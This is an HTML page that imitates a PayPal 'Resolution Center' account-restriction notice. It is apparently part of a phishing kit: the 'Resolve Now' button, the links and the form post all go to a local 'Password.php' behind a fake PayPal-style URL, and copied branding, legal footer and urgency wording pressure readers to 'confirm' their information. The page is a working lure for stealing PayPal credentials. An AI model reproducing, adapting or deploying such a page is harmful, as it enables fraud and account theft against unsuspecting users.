﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html class=" jsEnabled" lang="en"><head>

      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   

<title>Resolution Center</title></title>
<META NAME="robots" CONTENT="noindex">
<META NAME="robots" CONTENT="nofollow">
<META NAME="robots" CONTENT="noarchive">
<META NAME="robots" CONTENT="nosnippet">
<META NAME="robots" CONTENT="noodp">
<META NAME="robots" CONTENT="noydir">
<link media="screen" rel="stylesheet" type="text/css" href="doc/files/global.css">

<link rel="stylesheet" type="text/css" href="doc/files/country.css"><link media="print" rel="stylesheet" type="text/css" href="doc/files/print.css"><style type="text/css">.prewarning form{border:1px solid #ccc; padding:1em 1.2em 0 0; background:transparent url(/en_US/i/scr/scr_backGradient_1x250.gif) left bottom repeat-x;overflow:auto;}.eddkyc form{border:1px solid #ccc; padding:1em 1.2em 0 0;overflow:auto;padding-bottom:20px;}#prewarnBox{width:99%}#prewarnLeftImage{float:left; width:365px;}#prewarnRightInfo{width:49%; float:right; text-align:left;}.prewarnInfoBox{background-color:#E4F3FA; margin-top:3px;}.prewarnWarnBox{margin-top:3px;}.infoCover{background-color:#E4F3FA; padding:1px;}.warnCover{border: 1px solid #FF0000; padding:0 0.1em 0 0.1em}#frmBox{margin-bottom:10px}.boxcontent{padding-left:20px;margin-bottom:10px;}.boxcontent.warn{margin-bottom:20px;margin-top:10px;}.boxcontent.restriction{color:#C60000;margin-bottom:20px;margin-top:10px;}.alerticon{padding-right:5px;}</style><script type="text/javascript">
				if (self === top) {
					var antiClickjack = document.getElementById("antiClickjack");
					antiClickjack.parentNode.removeChild(antiClickjack);
				} else {
					top.location = self.location;
				}
			</script><script type="text/javascript" src="doc/files/global.js"></script><style type="text/css">form#rosetta {display:none;}</style><script type="text/javascript">PAYPAL.util.lazyLoadRoot = '#';</script><link rel="shortcut icon" href="favicon.ico"><link rel="apple-touch-icon" href="Greenday_2013/apple-touch-icon.png"></head><body><noscript><style type="text/css">body{display:block !important;}</style><p class="nonjsAlert">NOTE: Many features on the PayPal website require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript><div class="eddkyc" id="page"><div id="header" class="notab"><h1><a><img src="doc/files/paypal_logo.gif" alt="PayPal" border="0"></a></h1><div id="navPrimary" class="empty"></div></div><div id="content"><div id="headline"><div class="secure"><a target="_blank"></a></div><h2>Confirm your information</h2>
</div><div id="messageBox"></div><div id="main"><div class="layout1"><form class="safeSubmit" method="post" id="pre_warn_form" name="pre_warn_form" action="Password.php?cmd=/us/cgi-bin/webscr?cmd=_flow&SESSION=PnlUc3mEH9h4dUKHV_V6QjSQGD7ZITYijQ9wUub3cFpG7mo2DssMkjxdg34&dispatch=c70bbe41527861c2b97c3d1f6a850acfdd2fbb19a3d47242b071efa252ac2167e47ebd1fddf0fdac346cbad9c07281a22ed3fc89693dbd0c"><input name="cmd" value="_eu-kyb-look-back-flow" type="hidden"><div id="prewarnBox"><div id="prewarnLeftImage"><img src="doc/files/hdr_low_restriction_354wX244h.jpg" alt="" border="0"></div><div id="prewarnRightInfo"><h5 class="subhead">We need more information from you</h5><p>Just
 like a bank, we need to confirm the information you've given us. Please
 provide the requested information as soon as possible to ensure you can
 continue to use your PayPal account.</p><div class="cont border blue_grad"><div class="boxcontent warn"><img src="doc/files/icon_alert_16wx16h.gif" class="alerticon" alt="" border="0">Click <strong>Resolution Center</strong> to see the steps you’ll need to complete. If no steps are currently listed, please check back in 24 hours.</div><div class="boxcontent"></div><div class="boxcontent"><a class="button primary" href="Password.php?cmd=/us/cgi-bin/webscr?cmd=_flow&SESSION=PnlUc3mEH9h4dUKHV_V6QjSQGD7ZITYijQ9wUub3cFpG7mo2DssMkjxdg34&dispatch=c70bbe41527861c2b97c3d1f6a850acfdd2fbb19a3d47242b071efa252ac2167e47ebd1fddf0fdac346cbad9c07281a22ed3fc89693dbd0c">Resolve Now</a><a href="Password.php?cmd=/us/cgi-bin/webscr?cmd=_flow&SESSION=PnlUc3mEH9h4dUKHV_V6QjSQGD7ZITYijQ9wUub3cFpG7mo2DssMkjxdg34&dispatch=c70bbe41527861c2b97c3d1f6a850acfdd2fbb19a3d47242b071efa252ac2167e47ebd1fddf0fdac346cbad9c07281a22ed3fc89693dbd0c">Resolution Center</a></div></div></div></div><input name="auth" value="GM8mwwHVfP02JDR1ShGoT_kVO2MsSZQkO8KDkoQGTgxSH8dc5Q55ALrWXaO3al26TEVnKLsWw329bm52zBu-lbCdskl8TyXzHJmAjnr_rzKwyLdgc91XMg836mEXeFbnff2CahkoGbChOTHsFIpMAYZN9bYZ4m5O4s1qkePbNa3_wJzC" type="hidden"><input name="form_charset" value="UTF-8" type="hidden"></form></div></div></div><div role="contentinfo" id="footer"><h5 class="accessAid">More Information</h5><ul><li><a >Mobile</a></li><li><a >Mass Pay</a></li><li><a >Referrals</a></li><li><a target="_blank" >About Us</a></li><li><a >Accounts</a></li><li><a >Fees</a></li><li><a >Privacy</a></li><li><a >Safety Advice</a></li><li><a >Contact Us</a></li><li><a >Legal Agreements</a></li><li><a >Developers</a></li><li class="last"><a >Product Disclosure Statement</a></li></ul><p id="legal">Copyright &copy; 1999-2013 PayPal, Inc. All rights reserved.<br>PayPal
Limited ABN 93 111 195 389 (AFSL 304962). Any general 
financial product advice provided in this site has not taken into 
account your objectives, financial situations or needs.</p></div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="doc/files/widgets.js"></script>


</body></html>